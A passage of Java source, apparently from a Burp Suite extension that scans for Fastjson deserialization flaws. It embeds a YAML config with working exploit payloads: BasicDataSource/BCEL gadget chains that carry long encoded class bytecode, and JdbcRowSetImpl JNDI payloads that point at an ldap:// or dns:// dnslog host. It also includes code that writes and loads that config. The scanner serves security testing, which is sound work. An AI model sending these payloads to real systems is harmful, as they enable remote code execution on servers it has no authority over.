$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\\\"}}:\\\"x\\\"}\"\n" +
            "        - \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"x\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A\\\"}}:\\\"x\\\"}\"\n" +
            "        - \"{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\"},\\\"x\\\":{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"y\\\":{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\\\",\\\"$ref\\\":\\\"$.x.y.c.connection\\\"}}}}\"\n" +
            "\n" +
            "  # 远程命令扩展\n" +
            "  remoteCmdExtension:\n" +
            "    config:\n" +
            "      # 插件启动项\n" +
            "      isStart: true\n" +
            "      # 提供商\n" +
            "      provider: \"RemoteCmdScan\"\n" +
            "      payloads:\n" +
            "        # 新增自定义payload时记得将dns地址同一更改为dnslog-url\n" +
            "        - \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://dnslog-url\\\", \\\"autoCommit\\\":true}\"\n" +
            "        - \"{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"x\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://dnslog-url/miao1\\\",\\\"autocommit\\\":true}}\"\n" +
            "        - \"{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"x\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"dns://dnslog-url/miao1\\\",\\\"autocommit\\\":true}}\"\n" +
            "        - \"{\\\"dataSourceName\\\":\\\"ldap://dnslog-url/miao\\\",\\\"autoCommit\\\":true}\"\n" +
            "# dnsLog模块\n" +
            "dnsLogModule:\n" +
            "  # 提供商\n" +
            "  # 声明使用 dnslogs.impl 的哪个类,为该扩展提供服务\n" +
            "  # 目前集成方法:\n" +
            "  # DnsLogCn = http://dnslog.cn的接口\n" +
            "  # BurpDnsLog = burp自带的dnslog接口\n" +
            "  # CeyeDnslog = http://ceye.io的接口\n" +
            "  # EyesDnslog = https://eyes.sh的接口\n" +
            "\n" +
            "  # provider 填入上述任意平台名称即可\n" +
            "  provider: \"BurpDnsLog\"\n" +
            "  CeyeDnslog:\n" +
            "    token: \"\"\n" +
            "    Identifier: \"\"\n" +
            "  EyesDnslog:\n" +
            "    token: \"\"\n" +
            "    Identifier: \"\"";
    private YamlReader(IBurpExtenderCallbacks callbacks) throws FileNotFoundException {
        int lastIndexOf = callbacks.getExtensionFilename().lastIndexOf(File.separator);
        String path = "";
        CreateConfig(callbacks);
        path = callbacks.getExtensionFilename().substring(0,lastIndexOf) + File.separator + "resources/config.yml";
        File f = new File(path);
        this.configPath = f.toPath();
        properties = new Yaml().load(new FileInputStream(f));
//        reloadConfig(callbacks);
    }

    public static synchronized YamlReader getInstance(IBurpExtenderCallbacks callbacks) {
        if (instance == null) {
            try {
                instance = new YamlReader(callbacks);
            } catch (FileNotFoundException e) {
                callbacks.printError(e.toString());
            }
        }else {
             instance.reloadConfig(callbacks);
        }
        return instance;
    }
    // 新增：重新加载配置文件方法
    public static synchronized void reloadConfig(IBurpExtenderCallbacks callbacks) {
        try {
            int lastIndexOf = callbacks.getExtensionFilename().lastIndexOf(File.separator);
            configPath = Paths.get(callbacks.getExtensionFilename().substring(0,lastIndexOf) + File.separator + "resources/config.yml");
            File file = configPath.toFile();
            if (file.exists()) {
                long currentModified = file.lastModified();
                if (currentModified > lastModified) {
                    properties = new Yaml().load(new FileInputStream(file));
                    lastModified = currentModified;
                    callbacks.printOutput("配置文件已热更新");
                }
            }
        } catch (IOException e) {
            callbacks.printError("配置重载失败: " + e.getMessage());
        }
    }
    public void CreateConfig(IBurpExtenderCallbacks callbacks){
        int lastIndexOf = callbacks.getExtensionFilename().lastIndexOf(File.separator);
        String p = callbacks.getExtensionFilename().substring(0, lastIndexOf);
        Path path = Paths.get(p);
        Path resourceDir = path.resolve("resources");
        PrintWriter printWriter = new PrintWriter(callbacks.getStdout(), true);

        try {
            Files.createDirectories(resourceDir);
            Path configFile = resourceDir.resolve("config.yml");
            if (!Files.exists(configFile)){
                Files.write(configFile, CONFIG_CONTENTS.getBytes());
                printWriter.println("config.yml文件已生成");

            }else {
                printWriter.println("config.yml文件已存在，无需重新生成");
            }

        } catch (IOException e) {
            new PrintWriter(callbacks.getStderr(), true).println("配置文件生成失败: " + e.getMessage());
        }

    }

    /**
     * 获取yaml属性
     * 可通过 "." 循环调用
     * 例如这样调用: YamlReader.getInstance().getValueByKey("a.b.c.d")
     *
     * @param key
     * @return
     */
    public Object getValueByKey(String key) {
        String separator = ".";
        String[] separatorKeys = null;
        if (key.contains(separator)) {
            separatorKeys = key.split("\\.");
        } else {
            return properties.get(key);
        }
        Map<String, Map<String, Object>> finalValue = new HashMap<>();
        for (int i = 0; i < separatorKeys.length - 1; i++) {
            if (i == 0) {
                finalValue = (Map) properties.get(separatorKeys[i]);
                continue;
            }
            if (finalValue == null) {
                break;
            }
            finalValue = (Map) finalValue.get(separatorKeys[i]);
        }
        return finalValue == null ? null : finalValue.get(separatorKeys[separatorKeys.length - 1]);
    }

    public String getString(String key) {
        return String.valueOf(this.getValueByKey(key));
    }

    public String getString(String key, String defaultValue) {
        if (null == this.getValueByKey(key)) {
            return defaultValue;
        }
        return String.valueOf(this.getValueByKey(key));
    }

    public Boolean getBoolean(String key) {
        return (boolean) this.getValueByKey(key);
    }

    public Integer getInteger(String key) {
        return (Integer) this.getValueByKey(key);
    }

    public double getDouble(String key) {
        return (double) this.getValueByKey(key);
    }

    public List<String> getStringList(String key) {
        return (List<String>) this.getValueByKey(key);
    }

    public LinkedHashMap<String, Boolean> getLinkedHashMap(String key) {
        return (LinkedHashMap<String, Boolean>) this.getValueByKey(key);
    }
}